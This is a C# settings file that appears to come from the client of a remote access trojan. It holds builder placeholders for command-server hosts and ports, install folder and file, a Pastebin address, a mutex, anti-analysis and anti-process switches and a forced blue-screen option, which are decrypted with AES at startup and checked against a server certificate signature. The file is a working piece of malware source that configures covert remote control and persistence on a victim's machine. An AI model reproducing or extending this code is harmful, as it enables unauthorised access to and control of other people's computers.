using Client.Algorithm;
using Client.Helper;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace Client
{
    public static class Settings
    {
#if DEBUG
        public static string Por_ts = "8848";
        public static string Hos_ts = "127.0.0.1";
        public static string Ver_sion = "1.0.7";
        public static string In_stall = "false";
        public static string Install_Folder = "AppData";
        public static string Install_File = "Test.exe";
        // Note: Key is now derived from HWID, not hardcoded
        public static string Key = null; // Will be set in InitializeSettings()
        public static string MTX = "%MTX%";
        public static string Certifi_cate = "%Certificate%";
        public static string Server_signa_ture = "%Serversignature%";
        public static X509Certificate2 Server_Certificate;
        public static Aes256Enhanced aes256Enhanced;
        public static Aes256 aes256;
        public static string Paste_bin = "null";
        public static string BS_OD = "false";
        public static string Hw_id = HwidGen.HWID();
        public static string De_lay = "0";
        public static string Group = "Debug";
        public static string Anti_Process = "false";
        public static string An_ti = "false";

#else
        public static string Por_ts = "%Ports%";
        public static string Hos_ts = "%Hosts%";
        public static string Ver_sion = "%Version%";
        public static string In_stall = "%Install%";
        public static string Install_Folder = "%Folder%";
        public static string Install_File = "%File%";
        public static string Key = "%Key%";
        public static string MTX = "%MTX%";
        public static string Certifi_cate = "%Certificate%";
        public static string Server_signa_ture = "%Serversignature%";
        public static X509Certificate2 Server_Certificate;
        public static Aes256Enhanced aes256Enhanced;
        public static Aes256 aes256;
        public static string Paste_bin = "%Paste_bin%";
        public static string BS_OD = "%BSOD%";
        public static string Hw_id = null;
        public static string De_lay = "%Delay%";
        public static string Group = "%Group%";
        public static string Anti_Process = "%AntiProcess%";
        public static string An_ti = "%Anti%";
#endif


        public static bool InitializeSettings()
        {
#if DEBUG
            // In debug mode, derive key from HWID for security
            byte[] derivedKeyBytes = SecureKeyDerivation.DeriveKey("DebugEncryption", 32);
            Key = Convert.ToBase64String(derivedKeyBytes);
            aes256 = new Aes256(Key);
            aes256Enhanced = new Aes256Enhanced(Key);
            SecureKeyDerivation.WipeKey(derivedKeyBytes); // Clean up
            return true;
#endif
            try
            {
                // Decode builder-provided key
                string builderKey = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
                
                // Derive actual encryption key from builder key + HWID
                byte[] derivedKey = SecureKeyDerivation.DeriveFromBuilderKey(builderKey, "MainEncryption");
                if (derivedKey == null || !SecureKeyDerivation.ValidateKey(derivedKey))
                {
                    Logger.Error("Failed to derive valid encryption key", null);
                    return false;
                }
                
                Key = Convert.ToBase64String(derivedKey);
                
                // Initialize both encryption systems
                aes256 = new Aes256(Key);
                aes256Enhanced = new Aes256Enhanced(Key);
                
                // Wipe sensitive data from memory
                SecureKeyDerivation.WipeKey(derivedKey);
                Array.Clear(Encoding.UTF8.GetBytes(builderKey), 0, builderKey.Length);
                
                // Decrypt configuration
                Por_ts = aes256.Decrypt(Por_ts);
                Hos_ts = aes256.Decrypt(Hos_ts);
                Ver_sion = aes256.Decrypt(Ver_sion);
                In_stall = aes256.Decrypt(In_stall);
                MTX = aes256.Decrypt(MTX);
                Paste_bin = aes256.Decrypt(Paste_bin);
                An_ti = aes256.Decrypt(An_ti);
                Anti_Process = aes256.Decrypt(Anti_Process);
                BS_OD = aes256.Decrypt(BS_OD);
                Group = aes256.Decrypt(Group);
                Hw_id = HwidGen.HWID();
                Server_signa_ture = aes256.Decrypt(Server_signa_ture);
                Server_Certificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certifi_cate)));
                
                return VerifyHash();
            }
            catch (Exception ex)
            { 
                Logger.Error("Settings initialization failed", ex);
                return false; 
            }
        }
        private static bool VerifyHash()
        {
            try
            {
                var csp = (RSACryptoServiceProvider)Server_Certificate.PublicKey.Key;
                using (SHA256Managed sha = new SHA256Managed())
                {
                    return csp.VerifyHash(sha.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Server_signa_ture));
                }
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}